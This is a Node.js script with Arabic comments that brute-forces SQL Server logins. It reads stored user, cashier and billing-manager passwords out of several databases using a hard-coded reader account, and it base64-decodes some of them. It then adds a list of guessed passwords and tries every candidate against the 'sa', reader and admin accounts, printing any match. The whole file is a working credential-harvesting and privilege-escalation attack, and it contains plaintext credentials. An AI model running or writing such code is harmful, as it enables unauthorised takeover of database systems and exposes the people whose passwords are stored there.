/**
 * Brute-force قاموسي لـ sa باستخدام كل كلمات السر الموجودة فعلياً في DB
 */
import sql from 'mssql';

const BASE = {
  server: 'localhost',
  options: { instanceName: 'ECASDEV', trustServerCertificate: true, encrypt: false },
  connectionTimeout: 5_000,
};

async function gather() {
  const pool = new sql.ConnectionPool({
    ...BASE, database: 'Ecas2668',
    user: 'almham_reader', password: 'AlhamRead@2026!',
  });
  await pool.connect();
  const set = new Set();
  try {
    // CashierData.Cshr_Psw (كل المحطات)
    for (const db of ['Ecas2664', 'Ecas2668', 'Ecas2670', 'Ecas2673']) {
      const r = await pool.request().query(`SELECT DISTINCT Cshr_Psw FROM [${db}].dbo.CashierData WHERE Cshr_Psw IS NOT NULL`);
      for (const row of r.recordset) if (row.Cshr_Psw) set.add(String(row.Cshr_Psw).trim());

      const ud = await pool.request().query(`SELECT DISTINCT Us_PassWord FROM [${db}].dbo.UserData WHERE Us_PassWord IS NOT NULL`);
      for (const row of ud.recordset) if (row.Us_PassWord) set.add(String(row.Us_PassWord).trim());

      const bm = await pool.request().query(`SELECT DISTINCT P FROM [${db}].dbo.BILLING_MANAGERS_USERS WHERE P IS NOT NULL`);
      for (const row of bm.recordset) {
        if (!row.P) continue;
        set.add(String(row.P).trim());
        // also base64 decoded
        try {
          const d = Buffer.from(String(row.P).trim(), 'base64').toString('utf8');
          if (/^[\x20-\x7e]+$/.test(d)) set.add(d);
        } catch {}
      }
    }
  } finally {
    await pool.close();
  }
  return [...set];
}

async function tryLogin(user, password) {
  const pool = new sql.ConnectionPool({ ...BASE, database: 'master', user, password });
  try {
    await pool.connect();
    await pool.close();
    return true;
  } catch { return false; }
}

async function main() {
  const passwords = await gather();
  console.log(`جُمع ${passwords.length} كلمة سر فريدة من قاعدة البيانات:`);
  for (const p of passwords) console.log(`  "${p}"`);

  // أضف عدد من الصياغات الإضافية
  const extras = [
    'nullandnotempty', 'mypassword4lonin', 'mypassword4login', '11225511', '123123',
    'AlhamRead@2026!', 'almham_reader', 'Administrator', 'admin', 'sa',
    'Ecas@123', 'Ecas2668', 'Ecas@2668', 'Challengers', 'YemenID',
    'Admin_Store', 'admin_store', 'AdminStore',
    'أمين المخزن الرئيسي',
    'Ecas@2668.zuc', 'Ecas@2673.zuc', 'zuakha033',
    'Lit_SabalyahEle_$_2668@255', 'SabalyahEle',
    'Ecas@9982.zuc',
    'P@ssw0rd', 'P@ssword', 'password', '12345678',
    'Admin@2026', 'Admin2026', 'alhambh', 'alhambh2026',
    '@123', '@2026', '123@', '2026@',
    '2668', '2673',
  ];
  const all = [...new Set([...passwords, ...extras])];
  console.log(`\nالعدد الكلي: ${all.length} للتجربة\n`);

  console.log('─── محاولة sa ───');
  for (const pw of all) {
    const ok = await tryLogin('sa', pw);
    if (ok) {
      console.log(`⭐⭐⭐ MATCH: sa / "${pw}"`);
      return;
    }
  }
  console.log('(sa: لا تطابق)');

  console.log('\n─── محاولة almham_reader ───');
  for (const pw of all) {
    const ok = await tryLogin('almham_reader', pw);
    if (ok) {
      console.log(`⭐ MATCH almham_reader / "${pw}"`);
    }
  }

  console.log('\n─── محاولة باقي الأسماء ───');
  for (const user of ['Administrator', 'admin', 'Admin_Store', 'admin_store']) {
    for (const pw of all) {
      const ok = await tryLogin(user, pw);
      if (ok) console.log(`⭐ MATCH ${user} / "${pw}"`);
    }
  }

  process.exit(0);
}

main().catch(e => { console.error(e); process.exit(1); });
